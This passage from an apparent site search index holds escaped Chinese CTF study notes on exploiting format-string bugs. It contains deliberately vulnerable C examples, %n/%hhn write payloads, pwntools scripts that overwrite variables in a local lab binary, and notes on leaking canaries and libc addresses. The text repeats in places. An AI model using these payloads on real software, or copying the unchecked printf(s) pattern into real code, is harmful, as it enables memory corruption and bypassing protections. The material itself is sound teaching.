\u3002\u53d8\u91cf\u662f\u5c0f\u7aef\u5e8f\u5b58\u50a8\uff0c\u4e5f\u5728\u5185\u5b58\u4e2d\u662f\u8fd9\u6837\u7684\uff1a \\x78\\x56\\x34\\x12 \uff0c\u7b80\u5355\u70b9\u5c31\u662f\u4ece\u53f3\u5411\u5de6\u8986\u76d6\u3002 0x0804A028 \\x78 0x0804A029 \\x56 0x0804A02a \\x34 0x0804A02b \\x12 \u4e3a\u4e86\u4e0e\u8986\u76d6\u5c0f\u6570\u5b57\u7edf\u4e00\uff0c\u907f\u514d\u8ba1\u7b97\u5730\u5740\u5360\u7528\u5b57\u957f\uff0c\u5c06\u5730\u5740\u653e\u7f6e\u5728\u5b57\u7b26\u4e32\u672b\u5c3e\uff0c\u5f97\u51fa\u4ee5\u4e0b\u6846\u67b6\uff1a # \u683c\u5f0f\u5316\u5b57\u7b26\u4e32 payload = \" %x c%y$hhn %x c%y$hhn %x c%y$hhn %x c%y$hhn\" # \u76ee\u6807\u5730\u5740 payload += p32 ( 0x0804A028 ) + p32 ( 0x0804A028 + 1 ) + p32 ( 0x0804A028 + 2 ) + p32 ( 0x0804A028 + 3 ) x \u63a7\u5236\u8f93\u51fa\u591a\u5c11\u4e2a null \u5b57\u7b26\u3002 y \u5199\u5165\u5730\u5740\u7684\u504f\u79fb\u91cf\u3002 \u624b\u5de5\u8ba1\u7b97 c \u751f\u6210\u5b57\u7b26\u6570 \u00b6 \u5199\u5165\u987a\u5e8f\u4e3a\uff1a0x78\u30010x56\u30010x34\u30010x12 \u9700\u8981\u5199\u51650x78\uff0c\u5df2\u7ecf\u5b58\u50a80x0\u5b57\u7b26 0x78=120 x1=120 --- \u9700\u8981\u5199\u51650x56\uff0c\u5df2\u7ecf\u5b58\u50a80x78\u5b57\u7b26 0x156\u6ea2\u51fa\u5355\u5b57\u8282\u4e0a\u9650\uff0c\u5ffd\u7565\u8fdb\u4f4d\uff0c\u5b58\u50a80x56 0x156-0x78=222 x2=222 --- \u9700\u8981\u5199\u51650x34\uff0c\u5df2\u7ecf\u5b58\u50a80x156\u5b57\u7b26 0x234\u6ea2\u51fa\u5355\u5b57\u8282\u4e0a\u9650\uff0c\u5ffd\u7565\u8fdb\u4f4d\uff0c\u5b58\u50a80x34 0x234-0x156=222 x3=222 --- \u9700\u8981\u5199\u51650x12\uff0c\u5df2\u7ecf\u5b58\u50a80x234\u5b57\u7b26 0x312\u6ea2\u51fa\u5355\u5b57\u8282\u4e0a\u9650\uff0c\u5ffd\u7565\u8fdb\u4f4d\uff0c\u5b58\u50a80x12 0x312-0x234=222 x4=222 --- \u5f97\u5230\u7ed3\u679c\uff1a payload=\"%120c%y$hhn%222c%y$hhn%222c%y$hhn%222c%y$hhn\" \uff0c\u957f\u5ea6\u662f 44 \uff0c\u9884\u4f30\u5730\u5740\u504f\u79fb\u662f\u4e24\u4f4d\u6570\u5b57\uff0c\u518d\u8fdb\u884c\u4e00\u4e0b\u4fee\u6539\uff0c\u8ba1\u7b97\u5bf9\u9f50\u957f\u5ea6\u4e3a 0 \uff0c\u6700\u540e payload \u4e3a\uff1a payload=\"%120c%18$hhn%222c%19$hhn%222c%20$hhn%222c%21$hhn\" payload += p32(0x0804A028)+p32(0x0804A028+1)+p32(0x0804A028+2)+p32(0x0804A028+3) \u8986\u76d6\u6808\u5185\u5b58 \u00b6 \u786e\u5b9a\u8986\u76d6\u5730\u5740 \u00b6 \u8986\u76d6\u90a3\u91cc\u5185\u5bb9\u90fd\u597d\uff0c\u8986\u76d6\u5730\u5740\u80af\u5b9a\u8981\u660e\u786e\u7684\uff0c\u8986\u76d6\u6808\u4e0a\u53d8\u91cf\u4e5f\u662f\u9700\u8981\u7684\u3002\u53d8\u91cf\u5730\u5740\u4e00\u822c\u4f1a\u5b58\u653e\u5728\u6808\u4e0a\uff0c\u6211\u4eec\u5c31\u9700\u8981\u627e\u5230\u6808\u5b58\u653e\u8fd9\u4e2a\u53d8\u91cf\u5730\u5740\u7684\u504f\u79fb\u3002 \u786e\u5b9a\u76f8\u5bf9\u504f\u79fb \u00b6 \u8c03\u8bd5\u5728 printf \u6253\u65ad\u70b9\uff1a \u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500 ['0xffffcd0c', 'l8'] 8 0xffffcd0c\u2502+0x00: 0x080484d7 \u2192 <main+76> add esp, 0x10 \u2190 $esp 0xffffcd10\u2502+0x04: 0xffffcd28 \u2192 \"%d%d\" 0xffffcd14\u2502+0x08: 0xffffcd8c \u2192 0x00000315 0xffffcd18\u2502+0x0c: 0x000000c2 0xffffcd1c\u2502+0x10: 0xf7e8b6bb \u2192 <handle_intel+107> add esp, 0x10 0xffffcd20\u2502+0x14: 0xffffcd4e \u2192 0xffff0000 \u2192 0x00000000 0xffffcd24\u2502+0x18: 0xffffce4c \u2192 0xffffd07a \u2192 \"XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]\" 0xffffcd28\u2502+0x1c: \"%d%d\" \u2190 $eax \u5728 0xffffcd14 \u5904\u5b58\u50a8\u7740\u53d8\u91cf c \u7684\u5730\u5740\u3002\u504f\u79fb\u91cf\u4e3a 6 \u3002 \u8fdb\u884c\u8986\u76d6 \u00b6 \u8fd9\u6837\uff0c\u7b2c 6 \u4e2a\u53c2\u6570\u5904\u7684\u503c\u5c31\u662f\u5b58\u50a8\u53d8\u91cf c \u7684\u5730\u5740\uff0c\u6211\u4eec\u4fbf\u53ef\u4ee5\u5229\u7528 %n \u7684\u7279\u5f81\u6765\u4fee\u6539 c \u7684\u503c\u3002payload \u5982\u4e0b [addr of c]%012d%6$n addr of c \u7684\u957f\u5ea6\u4e3a 4\uff0c\u6545\u800c\u6211\u4eec\u5f97\u518d\u8f93\u5165 12 \u4e2a\u5b57\u7b26\u624d\u53ef\u4ee5\u8fbe\u5230 16 \u4e2a\u5b57\u7b26\uff0c\u4ee5\u4fbf\u4e8e\u6765\u4fee\u6539 c \u7684\u503c\u4e3a 16\u3002 \u5177\u4f53\u811a\u672c\u5982\u4e0b def forc(): sh = process('./overwrite') c_addr = int(sh.recvuntil('\\n', drop=True), 16) print hex(c_addr) payload = p32(c_addr) + '%012d' + '%6$n' print payload #gdb.attach(sh) sh.sendline(payload) print sh.recv() sh.interactive() forc() \u7ed3\u679c\u5982\u4e0b \u279c overwrite git:(master) \u2717 python exploit.py [+] Starting local process './overwrite': pid 74806 0xfffd8cdc \u070c\ufffd\ufffd%012d%6$n \u070c\ufffd\ufffd-00000160648modified c.","title":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u57fa\u7840\u5229\u7528"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E5%88%A9%E7%94%A8/#_1","text":"\u9605\u8bfb ctf-wiki \u540e\u603b\u7ed3","title":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u57fa\u7840\u5229\u7528"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E5%88%A9%E7%94%A8/#_2","text":"\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u83b7\u53d6\u6211\u4eec\u6240\u60f3\u8981\u8f93\u51fa\u7684\u5185\u5bb9\u3002\u4e00\u822c\u4f1a\u6709\u5982\u4e0b\u51e0\u79cd\u64cd\u4f5c \u6cc4\u9732\u6808\u5185\u5b58 \u83b7\u53d6\u67d0\u4e2a\u53d8\u91cf\u7684\u503c \u83b7\u53d6\u67d0\u4e2a\u53d8\u91cf\u5bf9\u5e94\u5730\u5740\u7684\u5185\u5b58 \u6cc4\u9732\u4efb\u610f\u5730\u5740\u5185\u5b58 \u5229\u7528 GOT \u8868\u5f97\u5230 libc \u51fd\u6570\u5730\u5740\uff0c\u8fdb\u800c\u83b7\u53d6 libc\uff0c\u8fdb\u800c\u83b7\u53d6\u5176\u5b83 libc \u51fd\u6570\u5730\u5740 \u76f2\u6253\uff0cdump \u6574\u4e2a\u7a0b\u5e8f\uff0c\u83b7\u53d6\u6709\u7528\u4fe1\u606f\u3002","title":"\u6cc4\u9732\u5185\u5b58"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E5%88%A9%E7%94%A8/#_3","text":"\u4f8b\u5982\uff0c\u7ed9\u5b9a\u5982\u4e0b\u7a0b\u5e8f #include <stdio.h> # file:leakmemory.c int main () { char s [ 100 ]; int a = 1 , b = 0x22222222 , c = -1 ; scanf ( \"%s\" , s ); printf ( \"%08x.%08x.%08x.%s \\n \" , a , b , c , s ); printf ( s ); //\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e return 0 ; } 32 \u4f4d\u7a0b\u5e8f\u4f7f\u7528\u7684\u662f\u6808\u4f20\u53c2\uff0c64 \u4f4d\u7cfb\u7edf\u524d 7 \u4e2a\u53c2\u6570\u662f\u7528\u5bc4\u5b58\u5668\u4f20\u53c2\u300232 \u4f4d\u7a0b\u5e8f\u53ef\u4ee5\u76f4\u63a5\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6cc4\u9732\u51fa\u5b58\u5728\u6808\u4e0a\u7684\u53c2\u6570\u3002\uff0864 \u4f4d\u8981\u5bf9\u5e94\u8c03\u6574\uff09 \u7f16\u8bd1 32 \u4f4d\u7a0b\u5e8f\uff1a gcc -m32 -fno-stack-protector -no-pie -o leakmemory leakmemory.c \u8f93\u5165\u8f93\u51fa\u5982\u4e0b\uff1a >>>%p.%p.%p 00000001 .22222222.ffffffff.%p.%p.%p 0xffffcd10.0xc2.0xf7e8b6bb \u6808\u60c5\u51b5\uff1a \u2500\u2500\u2500\u2500 [ stack ] \u2500\u2500\u2500\u2500 [ '0xffffccfc' , 'l8' ] 8 0xffffccfc\u2502+0x00: 0x080484ce \u2192 <main+99> add esp, 0x10 \u2190 $esp 0xffffcd00\u2502+0x04: 0xffffcd10 \u2192 \"%08x.%08x.%08x\" # \u5f00\u59cb\u6cc4\u9732\u4f4d\u7f6e 0xffffcd04\u2502+0x08: 0xffffcd10 \u2192 \"%08x.%08x.%08x\" 0xffffcd08\u2502+0x0c: 0x000000c2 0xffffcd0c\u2502+0x10: 0xf7e8b6bb \u2192 <handle_intel+107> add esp, 0x10 0xffffcd10\u2502+0x14: \"%08x.%08x.%08x\" \u2190 $eax 0xffffcd14\u2502+0x18: \".%08x.%08x\" 0xffffcd18\u2502+0x1c: \"x.%08x\"","title":"\u7b80\u5355\u7684\u6cc4\u9732\u6808\u5185\u5b58"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E5%88%A9%E7%94%A8/#_4","text":"\u4e0a\u9762\u5df2\u7ecf\u5b9e\u73b0\u4f9d\u6b21\u83b7\u53d6\u6808\u4e2d\u7684\u6bcf\u4e2a\u53c2\u6570\uff0c\u901a\u8fc7\u50cf\u4e0b\u9762\u8fd9\u6837\u6784\u9020\uff0c\u76f4\u63a5\u83b7\u53d6\u6307\u5b9a\u4e3a\u4f4d\u7f6e\u7684\u53c2\u6570\uff1a # \u7b2cn\u4e2a\u53c2\u6570 %n $p \u53ea\u8981\u77e5\u9053\u76ee\u6807\u6570\u636e\u5728\u6808\u4e0a\u7684\u504f\u79fb n \uff0c\u5c31\u80fd\u591f\u83b7\u53d6\u3002","title":"\u6cc4\u9732\u4efb\u610f\u5730\u5740\u5185\u5b58"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E5%88%A9%E7%94%A8/#_5","text":"","title":"\u5c0f\u603b\u7ed3"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E5%88%A9%E7%94%A8/#_6","text":"\u7406\u8bba\u4e0a\u4efb\u4f55\u6808\u4e0a\u6570\u636e\u90fd\u80fd\u88ab\u6cc4\u9732\u51fa\u6765\uff0c\u76ee\u524d\u9047\u5230\u8fc7\u7684\u6709\u4ee5\u4e0b\u8fd9\u4e9b\uff1a Canary \u6cc4\u9732\u51fa Canary \u7684\u503c\uff0c\u4ece\u800c\u7ed5\u8fc7 Canary \u4fdd\u62a4\u3002 text \u6bb5\u5730\u5740 \u6cc4\u9732\u51fa text \u6bb5\u7684\u771f\u5b9e\u5730\u5740\uff0c\u4ece\u800c\u7ed5\u8fc7 PIE \u5bf9\u4e8e text \u6bb5\u7684\u4fdd\u62a4\uff0c\u4e3a ROP \u5b9e\u73b0\u63d0\u4f9b\u57fa\u7840\u3002 libc \u51fd\u6570\u5730\u5740 \u6cc4\u9732 libc \u51fd\u6570\u5730\u5740\uff0c\u83b7\u53d6 libc base addr \u3002\u8fd9\u91cc\u4e5f\u53ef\u4ee5\u7528\u6765\u662f\u7ed5\u8fc7 PIE \u4fdd\u62a4\uff0c\u4f46\u6cc4\u9732 libc \u5730\u5740\u610f\u4e49\u4e0d\u6b62\u4e8e\u6b64\u3002 \u67d0\u4e9b\u53d8\u91cf \u6709\u4e9b\u9898\u76ee\u4f1a\u6709 if \u5224\u65ad\u8f93\u5165\u503c\u7b49\u662f\u5426\u4e0e\u9884\u5148\u8bbe\u5b9a\u7684\u503c\u76f8\u7b49\uff0c\u4ee5\u6b64\u589e\u52a0\u96be\u5ea6\u3002","title":"\u4f1a\u7528\u6765\u6cc4\u9732\u4ec0\u4e48"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E5%88%A9%E7%94%A8/#_7","text":"\u5229\u7528 %x \u6765\u83b7\u53d6\u5bf9\u5e94\u6808\u7684\u5185\u5b58\uff0c\u4f46\u5efa\u8bae\u4f7f\u7528 %p\uff0c\u53ef\u4ee5\u4e0d\u7528\u8003\u8651\u4f4d\u6570\u7684\u533a\u522b\u3002 \u5229\u7528 %s \u6765\u83b7\u53d6\u53d8\u91cf\u6240\u5bf9\u5e94\u5730\u5740\u7684\u5185\u5bb9\uff0c\u53ea\u4e0d\u8fc7\u6709\u96f6\u622a\u65ad\u3002 \u5229\u7528 %order x \u6765\u83b7\u53d6\u6307\u5b9a\u53c2\u6570\u7684\u503c\uff0c\u5229\u7528 %order x \u6765\u83b7\u53d6\u6307\u5b9a\u53c2\u6570\u7684\u503c\uff0c\u5229\u7528 %order s \u6765\u83b7\u53d6\u6307\u5b9a\u53c2\u6570\u5bf9\u5e94\u5730\u5740\u7684\u5185\u5bb9\u3002","title":"\u5173\u952e\u5b57\u9009\u62e9"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E5%88%A9%E7%94%A8/#_8","text":"\u8986\u76d6\u5185\u5b58\u4f7f\u7528\u7684 %n \u548c %c \u914d\u5408\u5b9e\u73b0\u3002 c \u7b80\u5355\u70b9\u6765\u8bf4\u5c31\u662f\u4ea7\u751f\u51e0\u4e2a null \u5b57\u7b26\u3002 n \u4e0d\u8f93\u51fa\u5b57\u7b26\uff0c\u4f46\u5c06\u6210\u529f\u8f93\u51fa\u7684\u5b57\u7b26\u4e2a\u6570\u5199\u5165\u5bf9\u5e94\u7684\u6574\u578b\u6307\u9488\u53c2\u6570\u6240\u6307\u7684\u53d8\u91cf\u3002 \u5199\u5165\u7684\u65f6\u5019\u4e5f\u6709\u591a\u79cd\u65b9\u5f0f\uff1a n\uff1aint hn\uff1ashort int \u5199\u5165\u53cc\u5b57\u8282 hhn\uff1achar int \u5199\u5165\u5355\u5b57\u8282 \u7ed9\u51fa\u5982\u4e0b\u7684\u7a0b\u5e8f\u6765\u4ecb\u7ecd\u76f8\u5e94\u7684\u90e8\u5206\uff0832\u4f4d\uff09\uff1a /* example/overflow/overflow.c */ #include <stdio.h> int a = 123 , b = 456 ; int main () { int c = 789 ; char s [ 100 ]; printf ( \"%p \\n \" , & c ); scanf ( \"%s\" , s ); printf ( s ); if ( c == 16 ) { puts ( \"modified c.\" ); } else if ( a == 2 ) { puts ( \"modified a for a small number.\" ); } else if ( b == 0x12345678 ) { puts ( \"modified b for a big number!\" ); } return 0 ; }","title":"\u8986\u76d6\u5185\u5b58"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E5%88%A9%E7%94%A8/#_9","text":"","title":"\u8986\u76d6\u4efb\u610f\u5730\u5740"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E5%88%A9%E7%94%A8/#_10","text":"\u8fd9\u91cc\u4ee5\u5c06 a \u8986\u76d6\u4e3a 2 \u4e3a\u4f8b\u3002\u9700\u8981\u5c06\u8986\u76d6\u7684\u76ee\u6807\u5730\u5740\u540e\u7f6e\uff0c\u56e0\u4e3a\u673a\u5668\u5b57\u957f\u4e3a 4 \uff0864 \u4f4d\u662f 8\uff09\u3002 \u6784\u9020\u5b57\u7b26\u4e32\u5982\u4e0b\uff1a aa%k$nxx[addr] aa \u4e24\u4e2a\u53ef\u89c1\u5b57\u7b26\uff0c\u6240\u4ee5\u6700\u540e\u4f1a\u5411\u76ee\u6807\u5730\u5740\u5199\u5165 2 \u3002 k \u76ee\u6807\u5730\u5740\u7684\u504f\u79fb\u4f4d\u7f6e\u3002 xx \u8ba9\u5b57\u7b26\u4e32\u5bf9\u5176\u673a\u5668\u5b57\u957f\uff0c\u8fd9\u91cc\u662f 4 \u3002 [addr] \u8986\u76d6\u7684\u76ee\u6807\u5730\u5740\u3002","title":"\u8986\u76d6\u5c0f\u6570\u5b57"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E5%88%A9%E7%94%A8/#_11","text":"\u5bf9\u9f50\u65b9\u6cd5\u5728 32 64 \u7a0b\u5e8f\u4e2d\uff0c\u8986\u76d6\u5927\u6570\u5b57\u3001\u5c0f\u6570\u5b57\u4e2d\u90fd\u901a\u7528\uff0c\u4ee5\u4e0a\u9762\u8fd9\u4e2a\u4e3a\u4f8b\u3002python \u4f7f\u7528 len \u8ba1\u7b97\u957f\u5ea6\u540e\uff0c\u7528\u673a\u5668\u5b57\u957f\u53d6\u4f59\uff0c\u4f59\u6570\u5c31\u662f\u5bf9\u9f50\u957f\u5ea6\u3002 # 32\u4f4d\u673a\u5668\u5b57\u957f\uff1a4 # 64\u4f4d\u673a\u5668\u5b57\u957f\uff1a8 >>> len ( \"aa%k$n\" ) % 4 2 \u7b2c\u4e00\u4e2a\u53ef\u63a7\u5b57\u7b26\u504f\u79fb\u662f 6 \uff0c aa%k$nxx \u957f\u5ea6\u4e3a 8 \uff08\u4e0d\u4f1a\u7b97\u5c31 python len\uff09\uff0c\u6240\u4ee5 k \u504f\u79fb\u5e94\u8be5\u662f 8 \u3002 \u6784\u9020\u8986\u76d6\u5c0f\u6570\u5b57\u5229\u7528\u4ee3\u7801\uff1a def fora (): sh = process ( './overwrite' ) a_addr = 0x0804A024 payload = 'aa%8$naa' + p32 ( a_addr ) sh . sendline ( payload ) print sh . recv () sh . interactive () \u5bf9\u5e94\u7684\u7ed3\u679c\u5982\u4e0b >>>python exploit.py 0xffc1729c aaaa$\\xa0\\x0modified a for a small number.","title":"\u600e\u4e48\u5bf9\u9f50"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E5%88%A9%E7%94%A8/#_12","text":"\u8986\u76d6\u57fa\u672c\u7ed3\u6784\u548c\u4e0a\u9762\u5dee\u4e0d\u591a\uff0c\u533a\u522b\u662f\u901a\u5e38\u662f\u8986\u76d6\u5927\u6570\u5b57\u4f1a\u5206\u6b21\u8986\u76d6\uff0c\u907f\u514d\u4e00\u4e0b\u6570\u636e\u592a\u5927\u800c\u4e0d\u6210\u529f\uff0c\u6240\u4ee5\u4f1a\u7528\u5230\u6807\u5fd7 hhn \u6216 hn \u3002 \u8fd8\u662f\u4f7f\u7528\u4e0a\u9762\u4f8b\u9898\uff0c\u5199\u5165\u7684\u76ee\u6807\u5730\u5740\u4e3a 0x0804A028 \u3002\u4f7f\u7528\u5355\u5b57\u8282\u5199\u5165\uff08hhn\uff09\uff0c\u5199\u5165\u503c\u4e3a 0x12345678 \u3002\u53d8\u91cf\u662f\u5c0f\u7aef\u5e8f\u5b58\u50a8\uff0c\u4e5f\u5728\u5185\u5b58\u4e2d\u662f\u8fd9\u6837\u7684\uff1a \\x78\\x56\\x34\\x12 \uff0c\u7b80\u5355\u70b9\u5c31\u662f\u4ece\u53f3\u5411\u5de6\u8986\u76d6\u3002 0x0804A028 \\x78 0x0804A029 \\x56 0x0804A02a \\x34 0x0804A02b \\x12 \u4e3a\u4e86\u4e0e\u8986\u76d6\u5c0f\u6570\u5b57\u7edf\u4e00\uff0c\u907f\u514d\u8ba1\u7b97\u5730\u5740\u5360\u7528\u5b57\u957f\uff0c\u5c06\u5730\u5740\u653e\u7f6e\u5728\u5b57\u7b26\u4e32\u672b\u5c3e\uff0c\u5f97\u51fa\u4ee5\u4e0b\u6846\u67b6\uff1a # \u683c\u5f0f\u5316\u5b57\u7b26\u4e32 payload = \" %x c%y$hhn %x c%y$hhn %x c%y$hhn %x c%y$hhn\" # \u76ee\u6807\u5730\u5740 payload += p32 ( 0x0804A028 ) + p32 ( 0x0804A028 + 1 ) + p32 ( 0x0804A028 + 2 ) + p32 ( 0x0804A028 + 3 ) x \u63a7\u5236\u8f93\u51fa\u591a\u5c11\u4e2a null \u5b57\u7b26\u3002 y \u5199\u5165\u5730\u5740\u7684\u504f\u79fb\u91cf\u3002","title":"\u8986\u76d6\u5927\u6570\u5b57"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E5%88%A9%E7%94%A8/#c","text":"\u5199\u5165\u987a\u5e8f\u4e3a\uff1a0x78\u30010x56\u30010x34\u30010x12 \u9700\u8981\u5199\u51650x78\uff0c\u5df2\u7ecf\u5b58\u50a80x0\u5b57\u7b26 0x78=120 x1=120 --- \u9700\u8981\u5199\u51650x56\uff0c\u5df2\u7ecf\u5b58\u50a80x78\u5b57\u7b26 0x156\u6ea2\u51fa\u5355\u5b57\u8282\u4e0a\u9650\uff0c\u5ffd\u7565\u8fdb\u4f4d\uff0c\u5b58\u50a80x56 0x156-0x78=222 x2=222 --- \u9700\u8981\u5199\u51650x34\uff0c\u5df2\u7ecf\u5b58\u50a80x156\u5b57\u7b26 0x234\u6ea2\u51fa\u5355\u5b57\u8282\u4e0a\u9650\uff0c\u5ffd\u7565\u8fdb\u4f4d\uff0c\u5b58\u50a80x34 0x234-0x156=222 x3=222 --- \u9700\u8981\u5199\u51650x12\uff0c\u5df2\u7ecf\u5b58\u50a80x234\u5b57\u7b26 0x312\u6ea2\u51fa\u5355\u5b57\u8282\u4e0a\u9650\uff0c\u5ffd\u7565\u8fdb\u4f4d\uff0c\u5b58\u50a80x12 0x312-0x234=222 x4=222 --- \u5f97\u5230\u7ed3\u679c\uff1a payload=\"%120c%y$hhn%222c%y$hhn%222c%y$hhn%222c%y$hhn\" \uff0c\u957f\u5ea6\u662f 44 \uff0c\u9884\u4f30\u5730\u5740\u504f\u79fb\u662f\u4e24\u4f4d\u6570\u5b57\uff0c\u518d\u8fdb\u884c\u4e00\u4e0b\u4fee\u6539\uff0c\u8ba1\u7b97\u5bf9\u9f50\u957f\u5ea6\u4e3a 0 \uff0c\u6700\u540e payload \u4e3a\uff1a payload=\"%120c%18$hhn%222c%19$hhn%222c%20$hhn%222c%21$hhn\" payload += p32(0x0804A028)+p32(0x0804A028+1)+p32(0x0804A028+2)+p32(0x0804A028+3)","title":"\u624b\u5de5\u8ba1\u7b97 c \u751f\u6210\u5b57\u7b26\u6570"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E5%88%A9%E7%94%A8/#_13","text":"","title":"\u8986\u76d6\u6808\u5185\u5b58"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E5%88%A9%E7%94%A8/#_14","text":"\u8986\u76d6\u90a3\u91cc\u5185\u5bb9\u90fd\u597d\uff0c\u8986\u76d6\u5730\u5740\u80af\u5b9a\u8981\u660e\u786e\u7684\uff0c\u8986\u76d6\u6808\u4e0a\u53d8\u91cf\u4e5f\u662f\u9700\u8981\u7684\u3002\u53d8\u91cf\u5730\u5740\u4e00\u822c\u4f1a\u5b58\u653e\u5728\u6808\u4e0a\uff0c\u6211\u4eec\u5c31\u9700\u8981\u627e\u5230\u6808\u5b58\u653e\u8fd9\u4e2a\u53d8\u91cf\u5730\u5740\u7684\u504f\u79fb\u3002","title":"\u786e\u5b9a\u8986\u76d6\u5730\u5740"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E5%88%A9%E7%94%A8/#_15","text":"\u8c03\u8bd5\u5728 printf \u6253\u65ad\u70b9\uff1a \u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500 ['0xffffcd0c', 'l8'] 8 0xffffcd0c\u2502+0x00: 0x080484d7 \u2192 <main+76> add esp, 0x10 \u2190 $esp 0xffffcd10\u2502+0x04: 0xffffcd28 \u2192 \"%d%d\" 0xffffcd14\u2502+0x08: 0xffffcd8c \u2192 0x00000315 0xffffcd18\u2502+0x0c: 0x000000c2 0xffffcd1c\u2502+0x10: 0xf7e8b6bb \u2192 <handle_intel+107> add esp, 0x10 0xffffcd20\u2502+0x14: 0xffffcd4e \u2192 0xffff0000 \u2192 0x00000000 0xffffcd24\u2502+0x18: 0xffffce4c \u2192 0xffffd07a \u2192 \"XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]\" 0xffffcd28\u2502+0x1c: \"%d%d\" \u2190 $eax \u5728 0xffffcd14 \u5904\u5b58\u50a8\u7740\u53d8\u91cf c \u7684\u5730\u5740\u3002\u504f\u79fb\u91cf\u4e3a 6 \u3002","title":"\u786e\u5b9a\u76f8\u5bf9\u504f\u79fb"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E5%88%A9%E7%94%A8/#_16","text":"\u8fd9\u6837\uff0c\u7b2c 6 \u4e2a\u53c2\u6570\u5904\u7684\u503c\u5c31\u662f\u5b58\u50a8\u53d8\u91cf c \u7684\u5730\u5740\uff0c\u6211\u4eec\u4fbf\u53ef\u4ee5\u5229\u7528 %n \u7684\u7279\u5f81\u6765\u4fee\u6539 c \u7684\u503c\u3002payload \u5982\u4e0b [addr of c]%012d%6$n addr of c \u7684\u957f\u5ea6\u4e3a 4\uff0c\u6545\u800c\u6211\u4eec\u5f97\u518d\u8f93\u5165 12 \u4e2a\u5b57\u7b26\u624d\u53ef\u4ee5\u8fbe\u5230 16 \u4e2a\u5b57\u7b26\uff0c\u4ee5\u4fbf\u4e8e\u6765\u4fee\u6539 c \u7684\u503c\u4e3a 16\u3002 \u5177\u4f53\u811a\u672c\u5982\u4e0b def forc(): sh = process('./overwrite') c_addr = int(sh.recvuntil('\\n', drop=True), 16) print hex(c_addr) payload = p32(c_addr) + '%012d' + '%6$n' print payload #gdb.attach(sh) sh.sendline(payload) print sh.recv() sh.interactive() forc() \u7ed3\u679c\u5982\u4e0b \u279c overwrite git:(master) \u2717 python exploit.py [+] Starting local process './overwrite': pid 74806 0xfffd8cdc \u070c\ufffd\ufffd%012d%6$n \u070c\ufffd\ufffd-00000160648modified c.","title":"\u8fdb\u884c\u8986\u76d6"},{"location":"Pwn/fmtstr/fmtstr_example/hijack_GOT/2016_CCTF_pwn3_writeup/","text":"2016 CCTF pwn3 \u00b6 \u8003\u70b9\uff1a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u3001hijack GOT\u3001\u5806 \u5206\u6790 \u00b6 